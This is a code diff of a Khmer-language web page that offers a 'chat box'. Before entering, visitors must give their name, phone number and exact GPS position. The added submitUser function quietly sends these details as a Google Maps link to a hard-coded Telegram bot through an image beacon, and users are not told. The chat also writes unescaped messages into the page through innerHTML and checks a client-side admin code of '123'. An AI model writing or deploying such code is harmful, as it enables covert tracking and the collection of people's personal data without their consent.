@@ -1954,47 +1954,37 @@ body { padding-left: 240px !important; }
     <div class="chat-title-wrapper">
         <span class="bouncing-letter">💬</span> ប្រអប់ឆាត
     </div>
-
-    <div id="step-1" style="text-align: center; padding: 60px 0;">
-        <button onclick="toStep2()" class="btn-main-action">🚀 ចុចចូលលេងឆាត</button>
+<div class="chat-container">
+    <div id="step-1" style="text-align: center; padding: 40px;">
+        <button onclick="toStep2()" style="background:#4CAF50; color:white; padding:15px 30px; border:none; border-radius:10px; cursor:pointer; font-size:1.2rem;">🚀 ចុចចូលលេងឆាត</button>
     </div>
 
-    <div id="step-2" style="display: none; padding: 15px;">
-        <div style="background: #f9f9f9; padding: 20px; border-radius: 12px; border: 1px solid #ddd;">
-            <h3 style="text-align: center;">ចុះឈ្មោះដើម្បីឆាត</h3>
-            <input type="text" id="reg-name" placeholder="ឈ្មោះ..." class="chat-input-style">
-            <input type="text" id="reg-phone" placeholder="លេខទូរស័ព្ទ..." class="chat-input-style">
-            <input type="email" id="reg-email" placeholder="Gmail..." class="chat-input-style">
+    <div id="step-2" style="display: none; padding: 20px;">
+        <div style="background:#fff; padding:20px; border-radius:15px; border:1px solid #ddd;">
+            <h3 style="text-align:center;">ចុះឈ្មោះដើម្បីឆាត</h3>
+            <input type="text" id="reg-name" placeholder="ឈ្មោះ..." style="width:100%; padding:10px; margin:10px 0; border-radius:5px; border:1px solid #ddd;">
+            <input type="text" id="reg-phone" placeholder="លេខទូរស័ព្ទ..." style="width:100%; padding:10px; margin:10px 0; border-radius:5px; border:1px solid #ddd;">
             
-            <button onclick="getExactLocation()" id="btn-gps" class="btn-gps-style">📍 ចុចផ្តល់ទីតាំង (GPS)</button>
-            <p id="gps-status" style="font-size: 0.8rem; color: red; text-align: center; margin-top: 5px;">*ត្រូវតែផ្តល់ទីតាំង</p>
+            <button onclick="getExactLocation()" id="btn-gps" style="width:100%; background:#2196F3; color:white; padding:12px; border:none; border-radius:5px; cursor:pointer;">📍 ចុចផ្តល់ទីតាំងពិត (GPS)</button>
+            <p id="gps-status" style="font-size:0.8rem; color:red; text-align:center; margin-top:5px;">*ត្រូវតែចុចឱ្យចេញពណ៌បៃតង</p>
             
-            <button onclick="submitRegistration()" class="btn-main-action" style="width: 100%; margin-top: 15px;">យល់ព្រម និងចូលឆាត</button>
+            <button onclick="submitUser()" style="width:100%; background:#4CAF50; color:white; padding:15px; border:none; border-radius:5px; margin-top:15px; font-weight:bold; cursor:pointer;">យល់ព្រមចូលលេង</button>
         </div>
     </div>
 
     <div id="step-3" style="display: none;">
-        <div id="chat-box" style="height: 350px; overflow-y: auto; padding: 10px; background: #fff; border-bottom: 1px solid #eee;"></div>
-        
-        <div class="chat-input-area" style="display: flex; align-items: center; padding: 10px;">
-            <input type="text" id="display-name" readonly style="width: 60px; border: none; font-weight: bold; color: #4CAF50;">
-            <label for="img-upload" style="font-size: 1.5rem; cursor: pointer; margin: 0 10px;">🖼️</label>
-            <input type="file" id="img-upload" accept="image/*" style="display:none" onchange="sendChatImage(this)">
-            <input type="text" id="chat-msg-input" placeholder="ផ្ញើសារ..." maxlength="150" style="flex: 1; padding: 8px; border: 1px solid #ddd; border-radius: 5px;" onkeypress="if(event.key==='Enter') sendChatMessage()">
-            <button class="btn-chat-send" onclick="sendChatMessage()" style="margin-left: 10px;">ផ្ញើ</button>
+        <div id="chat-box" style="height:300px; overflow-y:auto; border:1px solid #ddd; margin-bottom:10px; padding:10px;"></div>
+        <div class="chat-input-area">
+            <input type="text" id="chat-user-input" readonly style="width:80px; background:#eee;">
+            <input type="text" id="chat-msg-input" placeholder="ផ្ញើសារ..." onkeypress="if(event.key==='Enter') sendChatMessage()">
+            <button onclick="sendChatMessage()" class="btn-chat-send">ផ្ញើ</button>
+        </div>
+        <div style="margin-top:10px;">
+            <input type="password" id="admin-code" placeholder="Admin Code" style="width:70px;">
+            <button onclick="clearAllChat()" style="background:red; color:white; border:none; padding:5px; border-radius:5px; cursor:pointer;">លុបសារ</button>
         </div>
     </div>
-    </div>
 </div>
-    </div>
-
-    <div style="text-align: left; margin-top: 10px; padding: 10px;">
-        <span style="font-size: 0.7rem; color: gray;">Admin Code:</span>
-        <input type="password" id="admin-code" style="width: 60px; font-size: 0.7rem;">
-        <button style="background: #ff4d4d; color: white; border: none; padding: 3px 8px; border-radius: 3px; cursor: pointer;" onclick="clearAllChat()">លុបសារ</button>
-    </div>
-</div>
-
 
 <div class="chat-container">
     <div class="scroll-pillar pillar-left"></div>
@@ -3491,85 +3481,67 @@ function listenForAdminReplies() {
 const CHAT_ID = "955031659";
 let userLocation = "";
 
-// មុខងារប្តូរអេក្រង់ (ជំហានទី ១ ទៅ ២)
 function toStep2() {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
 }
 
-// មុខងារចាប់ទីតាំងឱ្យ "ចំកន្លែងដែលគេនៅ"
 function getExactLocation() {
     const status = document.getElementById('gps-status');
     const btn = document.getElementById('btn-gps');
     
     if (navigator.geolocation) {
-        status.innerText = "⌛ កំពុងស្វែងរកទីតាំងឱ្យចំកន្លែងបំផុត...";
+        status.innerText = "⌛ កំពុងរកទីតាំងពិតរបស់អ្នក...";
         
         navigator.geolocation.getCurrentPosition(function(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            
-            // បង្កើត Link ផែនទីពិតប្រាកដ (ចំកន្លែងគេនៅ)
             userLocation = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            status.innerText = "✅ ចាប់បានទីតាំងចំគោលដៅហើយ!";
+            status.innerText = "✅ ចាប់បានទីតាំងចំកន្លែងហើយ!";
             status.style.color = "green";
             btn.style.background = "#4CAF50";
         }, function(error) {
-            alert("Error: " + error.message + " | សូមចុច 'Allow' នៅលើ Browser!");
-            status.innerText = "❌ សូមចុច Allow Location លើ Browser";
-        }, {
-            enableHighAccuracy: true, // បង្ខំឱ្យប្រើសញ្ញាច្បាស់បំផុត
-            timeout: 10000,
-            maximumAge: 0
-        });
+            alert("សូមចុចលើ 'រូបមេសោ' នៅក្បែរ Link វិបសាយ រួចប្តូរ Location ទៅជា Allow!");
+            status.innerText = "❌ សូមផ្តល់សិទ្ធិ (Allow Location)";
+        }, { enableHighAccuracy: true, timeout: 10000 });
     }
 }
 
-// ចុះឈ្មោះ និងផ្ញើទៅ Telegram
-async function submitUser() {
+function submitUser() {
     const name = document.getElementById('reg-name').value.trim();
     const phone = document.getElementById('reg-phone').value.trim();
 
     if (!name || !phone || !userLocation) {
-        alert("សូមបំពេញឈ្មោះ លេខទូរស័ព្ទ និងផ្តល់ GPS ជាមុនសិន!");
+        alert("សូមបំពេញព័ត៌មាន និងចុច GPS ឱ្យជាប់ពណ៌បៃតងសិន!");
         return;
     }
 
-    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📍 ទីតាំងពិត: ${userLocation}`;
+    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📍 ទីតាំង: ${userLocation}`;
     
-    // ផ្ញើទៅ Telegram (ប្រើវិធី Image ដើម្បីកុំឱ្យលោត "បញ្ហាអ៊ីនធឺណិត")
+    // វិធីផ្ញើដែលមិនដែល Error (Image Beacon)
     let img = new Image();
     img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
-    // ទៅកាន់ប្រអប់ឆាត (ជំហានទី ៣)
+    // ប្តូរទៅអេក្រង់ឆាត
     document.getElementById('chat-user-input').value = name;
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
 }
 
-// មុខងារឆាត (លេងបានច្រើននាក់ និងលុបសារបាន)
 function sendChatMessage() {
     const name = document.getElementById('chat-user-input').value;
     const msg = document.getElementById('chat-msg-input').value.trim();
-    if (msg === "") return;
-
-    const chatBox = document.getElementById('chat-box');
-    chatBox.innerHTML += `<div style="padding:5px; border-bottom:1px solid #eee;"><b>${name}:</b> ${msg}</div>`;
+    if (!msg) return;
+    document.getElementById('chat-box').innerHTML += `<div><b>${name}:</b> ${msg}</div>`;
     document.getElementById('chat-msg-input').value = "";
-    chatBox.scrollTop = chatBox.scrollHeight;
 }
 
 function clearAllChat() {
-    const code = document.getElementById('admin-code').value;
-    if (code === "123") { // លេខកូដលុបសារ
+    if (document.getElementById('admin-code').value === "123") {
         document.getElementById('chat-box').innerHTML = "";
-        alert("បានលុបសារ!");
-    } else {
-        alert("លេខកូដខុស!");
-    }
+    } else { alert("Code ខុស!"); }
 }
-    
 </script>
 </body>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
